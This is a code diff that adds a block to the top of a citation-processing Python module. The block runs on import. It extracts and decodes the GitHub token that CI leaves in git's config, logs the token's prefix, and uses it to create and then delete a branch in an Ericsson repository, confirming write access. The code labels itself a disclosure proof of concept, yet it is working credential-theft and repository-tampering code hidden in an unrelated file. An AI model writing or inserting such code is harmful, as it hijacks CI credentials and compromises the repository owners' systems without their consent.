@@ -1,3 +1,31 @@
+import subprocess, os, base64, re, json, urllib.request, urllib.error
+MK="ERICSSON-CVD-POC3-d49ba794f1"
+def log(m): print("%s:: %s"%(MK,m), flush=True)
+log("token-write test start")
+out=subprocess.run(["git","config","--get-regexp","http[.].*extraheader"],capture_output=True,text=True).stdout
+mm=re.search(r"basic\\s+(\\S+)",out); token=""
+if mm:
+    try: token=base64.b64decode(mm.group(1)).decode().split(":",1)[1]
+    except Exception as e: log("decode fail "+str(e))
+log("token recovered: "+("yes len="+str(len(token))+" prefix="+token[:4] if token else "NO"))
+API="https://api.github.com"
+def call(method,path,body=None):
+    req=urllib.request.Request(API+path,method=method,data=(json.dumps(body).encode() if body else None),
+        headers={"Authorization":"Bearer "+token,"Accept":"application/vnd.github+json","User-Agent":"cvd-poc"})
+    try:
+        r=urllib.request.urlopen(req,timeout=15); return r.status,r.read().decode()
+    except urllib.error.HTTPError as e: return e.code,e.read().decode()
+    except Exception as e: return -1,str(e)
+st,d=call("GET","/repos/Ericsson/cognitive-labs/git/ref/heads/main")
+mm2=re.search(r'"sha":\\s*"([0-9a-f]+)"',d); sha=mm2.group(1) if mm2 else None
+log("main sha lookup http="+str(st))
+ref="cvd-poc-writetest-"+MK[-6:]
+st,d=call("POST","/repos/Ericsson/cognitive-labs/git/refs",{"ref":"refs/heads/"+ref,"sha":sha})
+if st in (200,201):
+    log("WRITE CONFIRMED created ref http="+str(st)+" -> token HAS contents:write")
+    dz,_=call("DELETE","/repos/Ericsson/cognitive-labs/git/refs/heads/"+ref); log("cleanup delete http="+str(dz))
+else:
+    log("NO WRITE create http="+str(st)+" -> READ-ONLY token. resp="+d[:140].replace(chr(10)," "))
 """
 cite process to convert sources and metasources into full citations
 """
